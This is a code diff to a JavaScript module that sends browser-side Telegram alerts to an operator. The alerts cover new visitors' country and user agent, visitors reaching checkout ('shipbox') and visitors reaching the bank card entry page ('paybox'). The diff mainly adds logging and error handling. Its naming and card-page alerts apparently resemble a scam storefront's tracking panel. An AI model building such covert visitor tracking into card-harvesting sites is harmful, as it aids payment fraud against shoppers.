@@ -61,19 +61,50 @@ const getFormattedTime = () => {
 // Send message to Telegram
 const sendTelegramMessage = (message) => {
   try {
+    console.log('[Telegram] Sending message...');
     const encodedMessage = encodeURIComponent(message);
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`;
     
     const xhr = new XMLHttpRequest();
     xhr.open('GET', url, true);
+    
+    xhr.onload = function() {
+      if (xhr.status === 200) {
+        console.log('[Telegram] Message sent successfully');
+        try {
+          const response = JSON.parse(xhr.responseText);
+          if (response.ok) {
+            console.log('[Telegram] ✅ Message delivered to Telegram');
+          } else {
+            console.error('[Telegram] ❌ Error from Telegram API:', response);
+          }
+        } catch (e) {
+          console.error('[Telegram] ❌ Failed to parse response:', e);
+        }
+      } else {
+        console.error('[Telegram] ❌ Request failed with status:', xhr.status);
+        console.error('[Telegram] Response:', xhr.responseText);
+      }
+    };
+    
+    xhr.onerror = function() {
+      console.error('[Telegram] ❌ Network error occurred');
+    };
+    
+    xhr.ontimeout = function() {
+      console.error('[Telegram] ❌ Request timeout');
+    };
+    
+    xhr.timeout = 10000; // 10 seconds timeout
     xhr.send();
   } catch (error) {
-    console.error('Error sending Telegram message:', error);
+    console.error('[Telegram] ❌ Error sending Telegram message:', error);
   }
 };
 
 // Send new user alert
 export const sendNewUserAlert = (userData = {}) => {
+  console.log('[Telegram] sendNewUserAlert called');
   const clientId = getClientId();
   const country = userData.country || getUserCountry();
   const userAgent = getUserAgent();
@@ -88,11 +119,13 @@ export const sendNewUserAlert = (userData = {}) => {
 📱 <b>User-Agent:</b> <code>${userAgent.substring(0, 80)}${userAgent.length > 80 ? '...' : ''}</code>
 ⏰ <b>Time:</b> <code>${time}</code>`.trim();
 
+  console.log('[Telegram] New user message:', message);
   sendTelegramMessage(message);
 };
 
 // Send checkout page alert (shipbox)
 export const sendCheckoutPageAlert = () => {
+  console.log('[Telegram] sendCheckoutPageAlert called');
   const clientId = getClientId();
   const cartTotal = getCartTotal();
   
@@ -102,11 +135,13 @@ export const sendCheckoutPageAlert = () => {
 
 💰 <b>Сумма корзины:</b> <code>$${cartTotal}</code>`.trim();
 
+  console.log('[Telegram] Checkout page message:', message);
   sendTelegramMessage(message);
 };
 
 // Send payment page alert (paybox)
 export const sendPaymentPageAlert = () => {
+  console.log('[Telegram] sendPaymentPageAlert called');
   const clientId = getClientId();
   
   const message = `💳 <b>Клиент [${clientId.substring(0, 12)}...] перешёл на страницу оплаты</b>
@@ -115,6 +150,7 @@ export const sendPaymentPageAlert = () => {
 
 🔐 <b>Страница:</b> Ввод данных банковской карты`.trim();
 
+  console.log('[Telegram] Payment page message:', message);
   sendTelegramMessage(message);
 };
 
